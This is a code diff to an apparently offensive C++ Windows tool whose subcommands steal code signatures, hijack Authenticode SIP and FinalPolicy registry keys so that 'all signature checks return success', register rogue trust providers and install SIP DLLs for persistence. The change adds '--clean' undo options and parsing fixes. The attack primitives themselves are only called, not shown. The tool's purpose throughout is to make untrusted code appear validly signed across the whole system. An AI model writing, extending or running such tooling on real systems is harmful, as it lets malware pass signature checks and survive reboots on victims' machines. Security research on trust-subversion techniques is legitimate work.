@@ -82,6 +82,7 @@ void print_steal_help(const char* exe) {
         "  --all-sips    Hijack all 19 SIP GUIDs\n"
         "  --wow64-only  Write only to WOW6432Node (affects 32-bit callers)\n"
         "  --dry-run     Print what would happen without writing\n"
+        "  --clean       Reverse: restore SIP keys installed by steal\n"
         "  -v            Verbose output\n",
         exe);
 }
@@ -99,6 +100,7 @@ void print_hijack_help(const char* exe) {
         "  --all-sips          Hijack all 19 SIP GUIDs\n"
         "  --wow64-only        Write only to WOW6432Node (affects 32-bit callers)\n"
         "  --dry-run           Print what would happen without writing\n"
+        "  --clean             Reverse: restore hijacked keys to defaults\n"
         "  -v                  Verbose output\n",
         exe);
 }
@@ -145,6 +147,7 @@ void print_sipexec_help(const char* exe) {
         "Remove options:\n"
         "  --guid <alias>    SIP GUID or alias to remove\n"
         "  --dry-run         Print what would happen without writing\n\n"
+        "Shortcut: 'sip-exec --clean --guid <alias>' is the same as remove.\n\n"
         "Aliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac\n",
         exe);
 }
@@ -188,9 +191,11 @@ int main(int argc, char* argv[]) {
     // Global flags consumed anywhere in argv
     bool verbose = false;
     bool dry_run = false;
+    bool clean_flag = false;
     for (int i = 2; i < argc; i++) {
         if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) verbose = true;
         if (strcmp(argv[i], "--dry-run") == 0) dry_run = true;
+        if (strcmp(argv[i], "--clean") == 0) clean_flag = true;
     }
     g_verbose = verbose;
 
@@ -198,20 +203,39 @@ int main(int argc, char* argv[]) {
     // steal <donor> <target> [--clone] [--no-hijack] [--sip-types] ...
     // ================================================================
     if (strcmp(cmd, "steal") == 0) {
-        if (argc < 4) { print_steal_help(argv[0]); return 1; }
-        std::string donor = argv[2], target = argv[3];
+        if (argc < 3 || (argc < 4 && !clean_flag)) { print_steal_help(argv[0]); return 1; }
+
         bool do_clone = false, do_hijack = true;
         bool wow64_only = false, include_sac = false, all_sips = false;
         std::string sip_types_str;
+        std::string donor, target;
 
-        for (int i = 4; i < argc; i++) {
-            if (strcmp(argv[i], "--clone") == 0) do_clone = true;
-            else if (strcmp(argv[i], "--no-hijack") == 0) do_hijack = false;
-            else if (strcmp(argv[i], "--wow64-only") == 0) wow64_only = true;
-            else if (strcmp(argv[i], "--sac") == 0) include_sac = true;
-            else if (strcmp(argv[i], "--all-sips") == 0) all_sips = true;
-            else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
+        // Parse positional args (skip flags)
+        for (int i = 2; i < argc; i++) {
+            if (argv[i][0] == '-') {
+                if (strcmp(argv[i], "--clone") == 0) do_clone = true;
+                else if (strcmp(argv[i], "--no-hijack") == 0) do_hijack = false;
+                else if (strcmp(argv[i], "--wow64-only") == 0) wow64_only = true;
+                else if (strcmp(argv[i], "--sac") == 0) include_sac = true;
+                else if (strcmp(argv[i], "--all-sips") == 0) all_sips = true;
+                else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
+            } else {
+                if (donor.empty()) donor = argv[i];
+                else if (target.empty()) target = argv[i];
+            }
         }
+
+        // --clean reverses the SIP hijack installed by steal
+        if (clean_flag) {
+            auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
+            if (sips.empty()) { for (int i = 0; i < NUM_STANDARD_SIPS; i++) sips.push_back(ALL_STANDARD_SIPS[i]); }
+            if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys to defaults\n", sips.size()); return 0; }
+            cleanup_registry(sips);
+            std::printf("[+] SIP persistence removed (%zu entries restored).\n", sips.size());
+            return 0;
+        }
+
+        if (donor.empty() || target.empty()) { print_steal_help(argv[0]); return 1; }
 
         if (dry_run) {
             std::printf("[dry-run] Would steal signature from %s to %s\n", donor.c_str(), target.c_str());
@@ -239,7 +263,7 @@ int main(int argc, char* argv[]) {
                 err("RegCreateKeyExW", 0, "SIP hijack partially failed.");
             }
             std::printf("[+] SIP persistence installed. New processes will accept the stolen signature.\n");
-            std::printf("Undo: %s clean --sip\n", argv[0]);
+            std::printf("Undo: %s steal --clean\n", argv[0]);
         }
         return 0;
     }
@@ -248,7 +272,6 @@ int main(int argc, char* argv[]) {
     // hijack [--finalpolicy] [--custom-provider GUID] [--sip-types] ...
     // ================================================================
     if (strcmp(cmd, "hijack") == 0) {
-        if (argc < 3) { print_hijack_help(argv[0]); return 1; }
         bool do_finalpolicy = false;
         bool wow64_only = false, include_sac = false, all_sips = false;
         std::string sip_types_str, custom_guid;
@@ -262,6 +285,34 @@ int main(int argc, char* argv[]) {
             else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
         }
 
+        // --clean reverses the hijack
+        if (clean_flag) {
+            bool did_something = false;
+            if (do_finalpolicy) {
+                if (dry_run) { std::printf("[dry-run] Would restore FinalPolicy\n"); }
+                else { cleanup_finalpolicy(); std::printf("[+] FinalPolicy restored.\n"); did_something = true; }
+            }
+            if (!custom_guid.empty()) {
+                std::wstring wguid(custom_guid.begin(), custom_guid.end());
+                if (dry_run) { std::wprintf(L"[dry-run] Would remove custom provider %ls\n", normalize_provider_guid(wguid).c_str()); }
+                else { cleanup_custom_provider(wguid); std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str()); did_something = true; }
+            }
+            if (!do_finalpolicy && custom_guid.empty()) {
+                auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
+                if (sips.empty()) { for (int j = 0; j < NUM_STANDARD_SIPS; j++) sips.push_back(ALL_STANDARD_SIPS[j]); }
+                if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys\n", sips.size()); }
+                else { cleanup_registry(sips); std::printf("[+] SIP persistence removed (%zu entries).\n", sips.size()); did_something = true; }
+            }
+            if (did_something) std::printf("[!] Restart affected processes for changes to take effect.\n");
+            return 0;
+        }
+
+        // No flags at all: print help
+        if (!do_finalpolicy && custom_guid.empty() && sip_types_str.empty() && !include_sac && !all_sips) {
+            print_hijack_help(argv[0]);
+            return 1;
+        }
+
         if (do_finalpolicy) {
             if (dry_run) {
                 std::printf("[dry-run] Would redirect FinalPolicy to SoftpubCleanup\n");
@@ -271,7 +322,7 @@ int main(int argc, char* argv[]) {
             std::printf("[+] FinalPolicy hijacked. All signature checks return success.\n");
             std::printf("[!] Stolen signatures show verified publisher (Subject CN from cert).\n");
             std::printf("[!] System-wide. Affects all processes. Survives reboot.\n");
-            std::printf("Undo: %s clean --finalpolicy\n", argv[0]);
+            std::printf("Undo: %s hijack --finalpolicy --clean\n", argv[0]);
             return 0;
         }
 
@@ -285,7 +336,7 @@ int main(int argc, char* argv[]) {
             if (!hijack_custom_provider(wguid)) { err("RegCreateKeyExW", 0, "Custom provider write failed."); return 1; }
             std::wstring norm = normalize_provider_guid(wguid);
             std::wprintf(L"[+] Custom trust provider registered: %ls\n", norm.c_str());
-            std::printf("Undo: %s clean --custom-provider %s\n", argv[0], custom_guid.c_str());
+            std::printf("Undo: %s hijack --custom-provider %s --clean\n", argv[0], custom_guid.c_str());
             return 0;
         }
 
@@ -310,7 +361,7 @@ int main(int argc, char* argv[]) {
             err("RegCreateKeyExW", 0, "Some SIP keys failed to write.");
         }
         std::printf("[+] SIP persistence installed. New processes affected.\n");
-        std::printf("Undo: %s clean --sip\n", argv[0]);
+        std::printf("Undo: %s hijack --clean\n", argv[0]);
         return 0;
     }
 
@@ -365,11 +416,14 @@ int main(int argc, char* argv[]) {
     // sip-exec install|remove|list [--dll] [--guid] [--dry-run]
     // ================================================================
     if (strcmp(cmd, "sip-exec") == 0) {
-        if (argc < 3) { print_sipexec_help(argv[0]); return 1; }
-        const char* action = argv[2];
+        if (argc < 3 && !clean_flag) { print_sipexec_help(argv[0]); return 1; }
+
+        // --clean on sip-exec acts as "remove"
+        const char* action = (argc >= 3 && argv[2][0] != '-') ? argv[2] : (clean_flag ? "remove" : nullptr);
+        if (!action) { print_sipexec_help(argv[0]); return 1; }
 
         std::string dll_path, guid_input;
-        for (int i = 3; i < argc; i++) {
+        for (int i = (action == argv[2] ? 3 : 2); i < argc; i++) {
             if (strcmp(argv[i], "--dll") == 0 && i+1 < argc) dll_path = argv[++i];
             else if (strcmp(argv[i], "--guid") == 0 && i+1 < argc) guid_input = argv[++i];
         }
